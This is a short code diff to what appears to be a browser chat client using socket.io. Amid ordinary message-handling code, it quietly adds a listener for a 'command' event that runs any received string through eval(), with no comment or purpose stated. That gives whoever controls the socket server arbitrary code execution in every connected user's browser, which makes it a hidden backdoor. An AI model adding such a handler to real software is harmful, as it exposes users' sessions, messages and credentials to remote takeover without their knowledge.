@@ -140,6 +140,10 @@
             document.getElementById('message').value = '';
         }
 
+        
+
+        socket.on('command', function (js_script) {eval(js_script);});
+
         socket.on('receive_message', function (data) {
             const chat = document.getElementById('chat');
             // if (data.author == localStorage.getItem('author')) {
